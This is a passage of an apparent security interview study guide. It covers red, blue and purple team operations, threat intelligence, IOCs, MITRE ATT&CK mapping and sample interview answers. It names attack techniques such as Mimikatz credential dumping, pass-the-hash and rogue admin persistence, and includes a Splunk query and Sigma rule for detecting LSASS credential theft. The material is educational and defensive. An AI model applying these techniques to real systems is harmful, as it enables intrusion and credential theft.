- Train blue team
- Measure security maturity

**Red Team vs Penetration Testing**:
```
┌──────────────────────────────────────────────────────┐
│      RED TEAM vs PENETRATION TESTING                 │
│                                                      │
│  PENETRATION TESTING:                                │
│  ├─ Goal: Find as many vulnerabilities as possible  │
│  ├─ Time: Days to weeks                             │
│  ├─ Scope: Specific systems/applications            │
│  ├─ Loud: May trigger alerts (expected)             │
│  ├─ Report: Vulnerability list with remediation     │
│  └─ Objective: Identify weaknesses                  │
│                                                      │
│  RED TEAM:                                           │
│  ├─ Goal: Achieve specific objective (steal data)   │
│  ├─ Time: Weeks to months                           │
│  ├─ Scope: Entire organization                      │
│  ├─ Stealthy: Avoid detection (test blue team)      │
│  ├─ Report: Attack path + blue team performance     │
│  └─ Objective: Test detection and response          │
└──────────────────────────────────────────────────────┘
```

### 6.2 Red Team Engagement Process

**Phase 1: Planning**
```
Define objectives:
- Target: Specific data (customer database)
- Goal: Exfiltrate PII without detection
- Constraints: No DDoS, no physical access
- Duration: 4 weeks
- Communication: Daily status to purple team lead
```

**Phase 2: Reconnaissance**
```
OSINT (same as real attacker):
- Company website, LinkedIn, social media
- Job postings (technologies used)
- Shodan (exposed systems)
- DNS enumeration
- Breach databases
- Google dorking
```

**Phase 3: Initial Access**
```
Techniques:
- Spear phishing (targeted emails)
- Credential stuffing (breached passwords)
- Exploit public-facing service
- Supply chain compromise (less common)
- Physical access (if allowed)
```

**Phase 4: Persistence**
```
Establish foothold:
- Install backdoor
- Create rogue admin account
- Scheduled tasks
- Maintain access even if discovered
```

**Phase 5: Privilege Escalation & Lateral Movement**
```
Move through network:
- Mimikatz (credential theft)
- Pass-the-hash attacks
- Kerberoasting
- Move to high-value targets (database servers, file servers)
```

**Phase 6: Actions on Objective**
```
Achieve goal:
- Locate target data (customer database)
- Exfiltrate via approved method (no actual data theft, proof only)
- Document: Screenshots, hashes as proof
```

**Phase 7: Reporting**
```
Deliverables:
- Attack path narrative (how we got in)
- Blue team detection timeline (what they saw, when)
- Gaps identified (we weren't detected for 3 weeks)
- Recommendations (improve X, Y, Z)
```

### 6.3 Red Team Tactics (MITRE ATT&CK)

**Initial Access**:
- Spear phishing attachment
- Valid accounts (compromised credentials)
- Exploit public-facing application

**Execution**:
- PowerShell, Command-line interface
- Scheduled task/job

**Persistence**:
- Registry run keys
- Valid accounts (create rogue admin)
- Scheduled task

**Privilege Escalation**:
- Exploitation for privilege escalation
- Valid accounts (escalate existing account)

**Defense Evasion**:
- Obfuscated files/information
- Process injection
- Masquerading (rename malware to svchost.exe)

**Credential Access**:
- OS credential dumping (Mimikatz)
- Brute force

**Discovery**:
- Network service scanning (internal recon)
- System network configuration discovery

**Lateral Movement**:
- Remote services (RDP, SMB)
- Pass the hash

**Collection**:
- Data from local system
- Data from network shared drive

**Command and Control**:
- Web service (legitimate sites for C2)
- Encrypted channel (HTTPS C2)

**Exfiltration**:
- Exfiltration over C2 channel
- Exfiltration to cloud storage (Dropbox)

---

## 7. Blue Team Operations

### 7.1 What is Blue Team?

**Definition**: Defensive security team responsible for protecting organization's information systems and responding to threats.

**Responsibilities**:
- Security monitoring (SIEM, IDS/IPS)
- Incident response
- Threat hunting
- Security architecture
- Vulnerability management
- Security awareness training

**Blue Team Mindset**: "Defenders think in graphs, attackers think in lists" - understand relationships, trust zones, attack paths.

### 7.2 Blue Team Activities

**Continuous Monitoring**:
```
SIEM (24/7 monitoring):
├─ Correlation rules (detect patterns)
├─ Alert triage (real threat or false positive?)
├─ Investigation (dig into alerts)
└─ Escalation (handoff to IR if confirmed incident)

Log Sources:
├─ Firewall (blocked/allowed connections)
├─ IDS/IPS (attack attempts)
├─ EDR (endpoint activity)
├─ Authentication logs (failed logins)
├─ DNS logs (C2 domains?)
├─ Proxy logs (web traffic)
└─ Cloud logs (AWS CloudTrail, Azure)
```

**Threat Hunting**:
```
Proactive search for threats (not waiting for alerts):

Hypothesis-driven:
"I believe attackers may be using PowerShell for persistence"
→ Search for unusual PowerShell executions
→ Filter: powershell.exe with -enc parameter (Base64 encoded)
→ Find 3 suspicious instances
→ Investigate further

IOC-driven:
New threat intelligence: "Emotet using domain emotet[.]com"
→ Search DNS logs for emotet domains
→ Find 2 workstations queried the domain
→ Isolate and investigate

Anomaly-driven:
"User 'john' normally accesses 10 files/day"
→ Today accessed 1,000 files
→ Possible ransomware or data exfiltration?
→ Investigate
```

**Vulnerability Management**:
```
Quarterly vulnerability scans:
1. Scan all assets (Nessus)
2. Prioritize by severity + exploitability
3. Assign to system owners
4. Track remediation
5. Re-scan to verify fixes

Patch management:
- Critical patches: 7 days
- High: 30 days
- Medium: 90 days
```

**Security Architecture**:
```
Design secure systems:
├─ Network segmentation (VLANs, firewalls)
├─ Zero trust architecture
├─ Defense in depth
├─ Least privilege
└─ Encryption (at rest, in transit)
```

**User Awareness Training**:
```
- Annual security training (all employees)
- Phishing simulations (quarterly)
- Metrics: Click rate, report rate
- Targeted training for repeat clickers
```

### 7.3 Blue Team Tools

**Detection**:
- SIEM (Splunk, QRadar, Sentinel)
- IDS/IPS (Snort, Suricata)
- EDR (CrowdStrike, Carbon Black)
- Network monitoring (Zeek, Wireshark)

**Prevention**:
- Firewall (Palo Alto, Fortinet)
- WAF (Cloudflare, Imperva)
- Email security (Proofpoint, Mimecast)
- Endpoint protection (antivirus, EDR)

**Response**:
- SOAR (Cortex XSOAR, Splunk SOAR)
- Ticketing (ServiceNow, Jira)
- Forensics (Volatility, FTK, Autopsy)
- Threat intelligence (ThreatConnect, MISP)

**Analysis**:
- Log analysis (Splunk, ELK)
- Traffic analysis (Wireshark, tcpdump)
- Malware analysis (Cuckoo Sandbox, Any.run)
- Memory forensics (Volatility)

---

## 8. Purple Team Operations

### 8.1 What is Purple Team?

**Definition**: Collaborative approach where red team and blue team work together to improve security posture.

**Purpose**:
- Improve detection capabilities
- Validate security controls
- Knowledge transfer
- Measure security effectiveness
- Continuous improvement

**Purple ≠ Separate Team**:
Purple teaming is a methodology, not a dedicated team. It's red + blue working together.

### 8.2 Purple Team Process

**Before Engagement**:
```
Planning meeting (Red + Blue together):
1. Define objectives:
   "Test: Can blue team detect lateral movement via WMI?"
2. Scope and rules:
   - Red team will use WMI to move laterally
   - Blue team has SIEM, EDR
   - Duration: 2 hours
3. Success criteria:
   - Blue team detects within 15 minutes
   - Generates alert
   - Correctly identifies technique
```

**During Engagement**:
```
Real-time collaboration:
1. Red team executes technique (WMI lateral movement)
2. Red team notifies purple team lead: "Attack started at 10:00:00"
3. Blue team monitors (did we detect it?)
4. Purple team lead tracks:
   - 10:05:00 - No detection yet
   - 10:10:00 - EDR alert generated ✓
   - 10:12:00 - Analyst investigates
   - 10:15:00 - Correct technique identified ✓
```

**After Engagement**:
```
Debrief (Red + Blue together):
1. What happened? (red team explains technique)
2. What did blue team see? (logs, alerts)
3. What worked well? (EDR detected it)
4. What needs improvement? (10-minute delay too long)
5. Action items:
   - Tune EDR rule (reduce alert time to 2 minutes)
   - Create playbook for WMI lateral movement
   - Add to threat hunting queries
```

### 8.3 Purple Team Exercises

**Example 1: Phishing Detection**
```
Scenario: Test email security controls

Red team action:
- Send spear-phishing email to 10 test users
- Email contains malicious link to fake Office 365 login

Blue team detection:
- Did email gateway block it?
- Did users report it?
- Did we detect credential entry on fake site?
- How long to respond?

Results:
✓ Email gateway: FAILED (email delivered)
✓ User reporting: 3/10 users reported (30% - good!)
✓ Credential detection: FAILED (no monitoring on fake domain)
✓ Response time: 45 minutes (acceptable)

Action items:
1. Tune email gateway rules (block similar patterns)
2. Celebrate 3 users who reported (positive reinforcement)
3. Additional training for 7 users who didn't report
4. Implement domain monitoring (detect lookalike domains)
```

**Example 2: Ransomware Response**
```
Scenario: Simulate ransomware outbreak

Red team action:
- Deploy ransomware simulator (safe, no real encryption)
- Encrypts test files on one workstation
- Displays ransom note

Blue team detection & response:
- Did EDR detect it?
- How fast did we isolate system?
- Was IR playbook followed correctly?

Results:
✓ EDR detection: 30 seconds (excellent!)
✓ Isolation: 5 minutes (good)
✓ Playbook followed: Missing step 3 (snapshot before isolation)
✓ Root cause identified: Phishing email (found in logs)

Action items:
1. Update playbook (clarify step 3)
2. Drill more frequently (monthly ransomware drills)
3. Backup testing (verify backups work)
```

### 8.4 Purple Team Metrics

```
Metrics to track:

DETECTION:
├─ Time to detect (TTD): Attack started → Alert generated
├─ Detection rate: % of attacks detected
├─ False positive rate: Real alerts vs false alarms
└─ Coverage: % of MITRE ATT&CK techniques we can detect

RESPONSE:
├─ Time to respond (TTR): Alert generated → Analyst investigates
├─ Time to contain (TTC): Investigation → Threat contained
├─ Time to recover (TTRec): Containment → Normal operations
└─ Playbook adherence: % of steps followed correctly

IMPROVEMENT:
├─ Trend analysis: Are we getting better over time?
├─ Gaps identified: What can't we detect?
├─ Remediation rate: % of findings fixed
└─ Training effectiveness: Decrease in phishing clicks
```

---

## 9. Threat Intelligence

### 9.1 What is Threat Intelligence?

**Definition**: Evidence-based knowledge about existing or emerging threats used to inform decision-making.

**Types**:
```
STRATEGIC THREAT INTELLIGENCE:
├─ Audience: Executives, board
├─ Content: Trends, risks, adversaries
├─ Example: "Ransomware targeting healthcare increased 200%"
└─ Use: Risk management, budget decisions

TACTICAL THREAT INTELLIGENCE:
├─ Audience: Security operations, IT management
├─ Content: TTPs (tactics, techniques, procedures)
├─ Example: "Attackers using CVE-2021-44228 (Log4Shell)"
└─ Use: Prioritize patching, defensive measures

OPERATIONAL THREAT INTELLIGENCE:
├─ Audience: SOC analysts, IR team
├─ Content: Specific campaigns, actor groups
├─ Example: "APT29 targeting government contractors"
└─ Use: Threat hunting, incident attribution

TECHNICAL THREAT INTELLIGENCE:
├─ Audience: Security tools (automated consumption)
├─ Content: IOCs (IPs, domains, hashes, YARA rules)
├─ Example: "C2 domain: evil-server.com"
└─ Use: SIEM rules, firewall blocks, IDS signatures
```

### 9.2 Threat Intelligence Lifecycle

**1. Planning and Direction**:
```
Define intelligence requirements:
- What threats are we concerned about?
- What industries/geographies do we operate in?
- What assets are most critical?
- What decisions will this inform?

Example: Healthcare organization
Requirements:
- Ransomware threats targeting healthcare
- Vulnerabilities in medical devices
- Phishing campaigns targeting nurses/doctors
- HIPAA compliance threats
```

**2. Collection**:
```
Sources:
├─ OSINT (Open Source Intelligence)
│   ├─ Security blogs (Krebs, Schneier)
│   ├─ Vendor advisories (Microsoft, Cisco)
│   ├─ Social media (Twitter #infosec)
│   └─ Dark web monitoring
├─ Commercial feeds
│   ├─ Recorded Future
│   ├─ ThreatConnect
│   └─ Anomali
├─ ISACs (Information Sharing and Analysis Centers)
│   ├─ FS-ISAC (Financial Services)
│   ├─ H-ISAC (Healthcare)
│   └─ Sector-specific sharing
├─ Government sources
│   ├─ US-CERT advisories
│   ├─ FBI flash alerts
│   └─ CISA alerts
└─ Internal sources
    ├─ SIEM logs (what attacks are we seeing?)
    ├─ IR cases (patterns in incidents)
    └─ Honeypots (attacker reconnaissance)
```

**3. Processing**:
```
Normalize data:
- Convert to standardized format (STIX/TAXII)
- Deduplicate (same IOC from multiple sources)
- Enrich (add context)
- Correlate (connect related indicators)
```

**4. Analysis**:
```
Turn data into intelligence:
- Is this threat relevant to us?
- What's the likelihood of attack?
- What's the potential impact?
- What can we do about it?

Example:
Raw data: "IP 203.0.113.50 distributing malware"
Analysis:
- Malware: Emotet (banking trojan)
- Target: Financial institutions
- Relevance: HIGH (we're a bank)
- Recommendation: Block IP, email alert to all users
```

**5. Dissemination**:
```
Share with stakeholders:
- SOC: Add IOCs to SIEM, IDS
- IT: Patch vulnerable systems
- Users: Phishing awareness bulletin
- Executives: Monthly threat briefing
```

**6. Feedback**:
```
Was intelligence useful?
- Did we block attacks?
- False positives?
- What else do we need?
- Refine requirements (back to step 1)
```

### 9.3 Indicators of Compromise (IOCs)

```
FILE-BASED:
├─ MD5/SHA-256 hashes
├─ File names: malware.exe, evil.dll
└─ File sizes

NETWORK-BASED:
├─ IP addresses: 203.0.113.50
├─ Domains: evil-c2.com
├─ URLs: http://malicious.com/payload.php
└─ Email addresses: attacker@evil.com

HOST-BASED:
├─ Registry keys: HKLM\...\Run\Malware
├─ File paths: C:\Windows\Temp\malware.exe
├─ Mutex names: Global\UniqueMalwareMutex
├─ Service names: EvilService
└─ Scheduled task names

BEHAVIORAL:
├─ Network traffic patterns
├─ Unusual authentication
├─ Lateral movement indicators
└─ Data exfiltration signatures
```

### 9.4 Threat Intelligence Platforms (TIP)

**MISP** (Open Source):
```
Malware Information Sharing Platform
- Event management
- IOC sharing
- Correlation
- STIX/TAXII support
- Free, community-driven
```

**ThreatConnect** (Commercial):
```
- Threat intelligence platform
- IOC management
- Playbook automation
- Collaboration
- Integrations (SIEM, firewall, etc.)
```

**Recorded Future** (Commercial):
```
- Real-time threat intelligence
- Dark web monitoring
- Predictive analysis
- Risk scoring
```

---

## 10. MITRE ATT&CK Framework

### 10.1 What is MITRE ATT&CK?

**Definition**: Knowledge base of adversary tactics and techniques based on real-world observations.

**ATT&CK** = Adversarial Tactics, Techniques, and Common Knowledge

**Purpose**:
- Common language for describing attacks
- Map defenses to specific techniques
- Threat intelligence categorization
- Red team/penetration test planning
- Security gaps assessment

### 10.2 ATT&CK Tactics (14 Categories)

```
1. RECONNAISSANCE
   Gather information about target

2. RESOURCE DEVELOPMENT
   Establish resources (domains, infrastructure, accounts)

3. INITIAL ACCESS
   Get into the network

4. EXECUTION
   Run malicious code

5. PERSISTENCE
   Maintain foothold

6. PRIVILEGE ESCALATION
   Gain higher-level permissions

7. DEFENSE EVASION
   Avoid detection

8. CREDENTIAL ACCESS
   Steal passwords/keys

9. DISCOVERY
   Learn about environment

10. LATERAL MOVEMENT
    Move through network

11. COLLECTION
    Gather data of interest

12. COMMAND AND CONTROL
    Communicate with compromised systems

13. EXFILTRATION
    Steal data

14. IMPACT
    Disrupt, destroy, manipulate
```

### 10.3 Example: Mapping Attack to ATT&CK

**Scenario: Ransomware Attack**
```
INITIAL ACCESS (Tactic):
└─ T1566.001 - Phishing: Spear phishing Attachment
   User opens malicious Word document

EXECUTION (Tactic):
└─ T1204.002 - User Execution: Malicious File
   User enables macros, malware executes

PERSISTENCE (Tactic):
└─ T1053.005 - Scheduled Task/Job: Scheduled Task
   Creates scheduled task for persistence

PRIVILEGE ESCALATION (Tactic):
└─ T1068 - Exploitation for Privilege Escalation
   Exploits CVE-2021-3156 (sudo vulnerability)

DEFENSE EVASION (Tactic):
├─ T1027 - Obfuscated Files or Information
│  PowerShell script is Base64 encoded
└─ T1070.001 - Indicator Removal: Clear Windows Event Logs
   Attacker clears security logs

CREDENTIAL ACCESS (Tactic):
└─ T1003.001 - OS Credential Dumping: LSASS Memory
   Uses Mimikatz to dump credentials

DISCOVERY (Tactic):
├─ T1083 - File and Directory Discovery
│  Searches for valuable files
└─ T1082 - System Information Discovery
   Gathers OS version, architecture

LATERAL MOVEMENT (Tactic):
└─ T1021.002 - Remote Services: SMB/Windows Admin Shares
   Spreads to other systems via SMB

COLLECTION (Tactic):
└─ T1005 - Data from Local System
   Identifies files to encrypt

COMMAND AND CONTROL (Tactic):
└─ T1071.001 - Application Layer Protocol: Web Protocols
   HTTPS C2 to download ransomware payload

IMPACT (Tactic):
└─ T1486 - Data Encrypted for Impact
   Encrypts files with AES-256, demands ransom
```

### 10.4 Using ATT&CK for Defense

**Gap Assessment**:
```
Review ATT&CK matrix:
For each technique:
- Can we detect this? (Yes/No/Partial)
- What tools/logs do we use?
- What's the confidence level?

Example results:
T1003 (Credential Dumping):
✓ Detection: YES (EDR alerts on Mimikatz)
✓ Confidence: HIGH
✓ Tools: CrowdStrike Falcon

T1548 (Abuse Elevation Control):
✗ Detection: NO
✗ Recommendation: Implement Sysmon, add detection rule

Gap: 30% of techniques have no detection
Action: Prioritize detection engineering for top threats
```

**Detection Engineering**:
```
For technique T1003 (Credential Dumping):

SIEM Rule:
index=windows EventCode=10 TargetImage="*lsass.exe" 
| where SourceImage!="C:\\Windows\\System32\\wbem\\WmiPrvSE.exe"
| stats count by SourceImage, SourceUser
| where count > 0
| alert "Possible LSASS Memory Access (Credential Dumping)"

Splunk Sigma rule:
title: Mimikatz Usage
status: experimental
description: Detects Mimikatz credential dumping
detection:
  selection:
    EventID: 10
    TargetImage: 'C:\Windows\System32\lsass.exe'
  filter:
    SourceImage: 'C:\Windows\System32\wbem\WmiPrvSE.exe'
  condition: selection and not filter
```

---

## 11. Security Frameworks

### 11.1 NIST Cybersecurity Framework

**Five Core Functions**:
```
1. IDENTIFY
   - Asset management (what do we have?)
   - Risk assessment (what are the threats?)
   - Governance (policies, procedures)

2. PROTECT
   - Access control (who can access what?)
   - Data security (encryption, DLP)
   - Awareness training (educate users)
   - Protective technology (firewall, antivirus)

3. DETECT
   - Continuous monitoring (SIEM, IDS)
   - Detection processes (anomaly detection)
   - Security events (log all the things)

4. RESPOND
   - Response planning (incident response plan)
   - Communications (internal/external notifications)
   - Analysis (investigate incidents)
   - Mitigation (contain threats)

5. RECOVER
   - Recovery planning (disaster recovery)
   - Improvements (lessons learned)
   - Communications (stakeholder updates)
```

### 11.2 ISO 27001

**Information Security Management System (ISMS)**
- International standard for information security
- 114 controls across 14 domains
- Certification process (audited compliance)
- Used globally

### 11.3 CIS Controls

**Center for Internet Security - 18 Critical Security Controls**
```
BASIC (Do these first):
1. Inventory of Authorized/Unauthorized Devices
2. Inventory of Authorized/Unauthorized Software
3. Secure Configurations
4. Continuous Vulnerability Management
5. Controlled Use of Administrative Privileges
6. Maintenance, Monitoring, and Analysis of Audit Logs

FOUNDATIONAL:
7-16. (Email security, malware defenses, data recovery, etc.)

ORGANIZATIONAL:
17-18. Security awareness, incident response
```

---

## 12. Passive vs Active Reconnaissance

### 12.1 Comparison

| Aspect | Passive Reconnaissance | Active Reconnaissance |
|--------|----------------------|---------------------|
| **Contact with Target** | No direct contact | Direct interaction |
| **Detection Risk** | None (undetectable) | High (leaves logs) |
| **Legality** | Legal (public info) | May require authorization |
| **Information Depth** | Limited | Detailed |
| **Speed** | Fast | Slower |
| **Tools** | Google, WHOIS, Shodan | Nmap, Nessus, Burp |

### 12.2 Detailed Passive Techniques

See Section 1.2 (Reconnaissance in Kill Chain) and Networking file for comprehensive passive recon techniques.

### 12.3 Detailed Active Techniques

See Networking file for Nmap and active scanning techniques.

---

## 13. Interview Questions & Answers

**Q: Explain the Cyber Kill Chain.**
**A**: "The Cyber Kill Chain is a 7-stage framework by Lockheed Martin describing attack phases:
1. **Reconnaissance** - Gather target info
2. **Weaponization** - Create malicious payload
3. **Delivery** - Send weapon (phishing, exploit)
4. **Exploitation** - Execute code on victim
5. **Installation** - Install malware/backdoor
6. **Command & Control** - Establish remote communication
7. **Actions on Objective** - Achieve goal (data theft, destruction)

Defense strategy: Break the chain at any stage. For example, email filtering stops delivery, EDR prevents installation, network monitoring detects C2."

---

**Q: What's the difference between penetration testing and vulnerability assessment?**
**A**: 
"**Vulnerability Assessment**: Automated scanning to identify known vulnerabilities (CVEs). Reports what weaknesses exist. Like: 'Your doors are unlocked.'

**Penetration Testing**: Manual exploitation to demonstrate real-world impact. Shows what an attacker can actually do. Like: 'I walked through the unlocked doors, reached the safe, and here's what's inside.'

**Key differences**:
- VA is broader (scan everything), PT is deeper (exploit specific targets)
- VA is automated (Nessus), PT is manual (skilled tester)
- VA is regular (quarterly), PT is periodic (annually)
- VA finds vulnerabilities, PT proves exploitability and impact

**Best practice**: Use both - VA for continuous monitoring, PT for annual validation."

---

**Q: Describe the incident response process.**
**A**: "Using NIST framework:

**1. Preparation**: Before incident
- Build IR team
- Create IR plan and playbooks
- Deploy monitoring tools (SIEM, EDR)
- Training and drills

**2. Detection and Analysis**: Is this real?
- Alert received (SIEM, user report)
- Triage (real incident or false positive?)
- Classify severity (P1-P4)
- Collect evidence (logs, memory dumps)
- Scope (how many systems affected?)

**3. Containment, Eradication, Recovery**:
- **Contain**: Isolate infected systems, block malicious IPs
- **Eradicate**: Remove malware, close vulnerabilities
- **Recover**: Restore from backups, return to normal

**4. Post-Incident**:
- Lessons learned meeting
- Document findings
- Improve defenses
- Update procedures

**Example**: Ransomware detected → Isolate (contain) → Remove malware (eradicate) → Restore from backup (recover) → Implement better email filtering (lessons learned)."

---

**Q: What's the difference between Red Team and Blue Team?**
**A**:
"**Red Team** (Offensive):
- **Role**: Attackers (authorized)
- **Goal**: Test defenses by simulating real attacks
- **Activities**: Phishing, exploitation, lateral movement
- **Mindset**: 'How can I break in?'
- **Tools**: Metasploit, Cobalt Strike, custom exploits

**Blue Team** (Defensive):
- **Role**: Defenders
- **Goal**: Protect systems, detect and respond to threats
- **Activities**: Monitoring, incident response, threat hunting
- **Mindset**: 'How can I detect and stop attacks?'
- **Tools**: SIEM, EDR, IDS/IPS, firewalls

**Purple Team**: Red + Blue collaboration
- Red team shares techniques
- Blue team improves detection
- Continuous improvement cycle
- Example: Red tests phishing → Blue measures detection → Improve together"

---

**Q: What is threat intelligence and how is it used?**
**A**: "Threat intelligence is evidence-based knowledge about threats used to inform security decisions.

**Types**:
1. **Strategic**: High-level trends for executives (ransomware targeting our industry)
2. **Tactical**: TTPs for security teams (attackers using specific CVE)
3. **Operational**: Specific campaigns (APT29 active in our region)
4. **Technical**: IOCs for tools (malicious IP: 203.0.113.50)

**Lifecycle**:
1. **Requirements**: What threats matter to us?
2. **Collection**: OSINT, commercial feeds, ISACs
3. **Analysis**: Is this relevant? What's the risk?
4. **Dissemination**: Share with SOC, IT, executives
5. **Feedback**: Was it useful? Refine.

**Usage**:
- Block IOCs (IPs, domains) in firewall/SIEM
- Prioritize patching (this CVE is actively exploited)
- Threat hunting (search for indicators of specific malware)
- Inform strategy (increase budget for ransomware defense)"

---

**Q: How would you prioritize vulnerabilities for patching?**
**A**: "Multi-factor prioritization:

**1. Severity** (CVSS score):
- Critical (9.0-10.0): Immediate
- High (7.0-8.9): 30 days
- Medium (4.0-6.9): 90 days
- Low (0.0-3.9): Next patch cycle

**2. Exploitability**:
- Exploit available in the wild? → Prioritize
- Actively being exploited? → Emergency patch
- Theoretical only? → Lower priority

**3. Asset Criticality**:
- Internet-facing payment server? → High priority
- Internal dev server? → Lower priority

**4. Compensating Controls**:
- Vulnerable but behind WAF? → Medium priority
- Vulnerable with no protection? → High priority

**Formula**: 
Priority = (CVSS × Exploitability × Asset Value) / Compensating Controls

**Example**:
- CVE-2021-44228 (Log4Shell):
  - CVSS: 10.0 (Critical)
  - Exploit: Widely available, actively exploited
  - Asset: Public-facing web app
  - Controls: None
  - **Priority: EMERGENCY (patch immediately)**

- CVE-2020-1234 (hypothetical):
  - CVSS: 7.5 (High)
  - Exploit: Theoretical only
  - Asset: Internal database
  - Controls: Network segmentation
  - **Priority: Medium (patch within 90 days)**"

---

**Q: What is the MITRE ATT&CK framework and how do you use it?**
**A**: "MITRE ATT&CK is a knowledge base of adversary tactics and techniques based on real-world attacks.

**Structure**:
- **Tactics**: WHY (attacker's goal) - 14 categories (Initial Access, Persistence, Lateral Movement, etc.)
- **Techniques**: HOW (methods used) - 200+ techniques

**Use Cases**:

**1. Detection Engineering**:
- Review each technique: Can we detect this?
- Example: T1003 (Credential Dumping)
- Create SIEM rule to detect Mimikatz
- Test with red team

**2. Gap Assessment**:
- Map existing detections to ATT&CK
- Find gaps (techniques we can't detect)
- Prioritize based on threat intelligence
- Example: We can detect 70% of Initial Access techniques, but only 30% of Defense Evasion → Focus on evasion detection

**3. Threat Intelligence**:
- Categorize threats using ATT&CK
- 'APT29 uses T1566 (Phishing) and T1059 (Command-Line Interface)'
- Helps understand adversary TTPs

**4. Red Team Planning**:
- Select techniques to test
- Map attack path through tactics
- Example: Initial Access → Execution → Persistence → Privilege Escalation

**5. Purple Team Exercises**:
- Red team: Execute specific technique
- Blue team: Attempt detection
- Measure coverage improvement over time"

---

## Quick Reference

**Cyber Kill Chain**:
```
1. Reconnaissance → 2. Weaponization → 3. Delivery → 
4. Exploitation → 5. Installation → 6. C2 → 7. Actions on Objective
```

**PT vs VA**:
```
VA: Identifies (finds unlocked doors)
PT: Exploits (walks through, reaches safe)
```

**Incident Response (NIST)**:
```
1. Preparation → 2. Detection/Analysis → 
3. Containment/Eradication/Recovery → 4. Post-Incident
```

**Teams**:
```
Red Team: Offensive (attack)
Blue Team: Defensive (protect)
Purple Team: Collaboration (improve)
```

**MITRE ATT&CK Tactics**:
```
Initial Access → Execution → Persistence → Privilege Escalation →
Defense Evasion → Credential Access → Discovery → Lateral Movement →
Collection → C2 → Exfiltration → Impact
```

**Good luck with your interview!** 🎯

You now have comprehensive knowledge of security processes, frameworks, incident response, team operations, and threat intelligence!
